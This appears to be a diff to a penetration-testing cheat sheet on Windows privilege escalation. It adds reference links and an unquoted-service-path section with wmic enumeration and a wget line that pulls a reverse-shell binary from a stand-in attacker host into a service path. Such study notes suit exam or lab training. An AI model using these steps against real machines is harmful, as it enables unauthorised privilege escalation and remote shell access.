@@ -2,6 +2,13 @@
 
 Windows privilege escalation commands.
 
+Other guides just in case:
+* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
+* http://www.fuzzysecurity.com/tutorials/16.html
+* https://github.com/xapax/security/blob/master/privilege_escalation_windows.md
+* https://guif.re/windowseop?fbclid=IwAR0jmCV-uOLaUJCnKiGB2ZaDt9XZwlAGM3nTOH0GkS6c0hS63FFSGm97Tdc
+
+
 ### 1. SYSTEM INFORMATION + ACCOUNTS
 
 ```powershell
@@ -82,6 +89,22 @@ For restarting services or binaries, try various methods to restart:
 $ net start
 $ sc start
 $mysql> RESTART;    # using service commands itself to restart
+```
+
+Unquoted service paths:  
+A service is vulnerable path to the executable has a space in the filename and the file name is not wrapped in quote marks; exploitation requires write permissions to the path before the quote mark.
+```powershell
+# SCENARIO 1
+$ wmic service get name,pathname        # Find possible vulnerable services
+SERVICENAME           PATH
+. . .                 . . .
+PFNet                 C:\Program Files\Privacyware\PrivFirewall 7.0\pfw.exe
+. . .                 . . .
+$ wmic service get pathname,startname   # Check if service runs with Admin privileges
+$ wget http://attacker.com/rshell.exe -O C:\Program Files (x86)\Privacyware\PrivFirewall.exe   # Transfer rshell to path
+$ net start service / reboot computer /
+
+
 ```
 
 Windows weak service permissions:
